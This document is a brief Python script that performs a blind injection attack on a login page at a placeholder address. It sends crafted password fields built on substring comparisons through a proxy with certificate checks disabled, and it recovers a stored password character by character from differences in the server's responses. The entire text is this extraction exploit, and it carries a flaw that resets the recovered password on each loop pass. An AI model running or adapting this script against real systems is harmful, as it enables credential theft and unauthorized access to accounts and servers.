import requests

url = "http://x.x.x.x/file.php"
char = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-;'"<>?,."
proxies = {
    "http" : "http://x.x.x.x:xxxx",
}
password = ''
for i in range(1, 80):
    found = False
    password = ''
    for j in char:
        data = {'Username':'abc', 'Password': "' or substring(Password,"+str(i)+",1)='"+j+"' or '"}
        response = requests.post(url, data=data, proxies=proxies, verify=False)
        if "user" in response.text:
            found = True
            #print(f"The character found was {j} ")
            break
    if not found:
        break
        
    password +=j
    print(password)
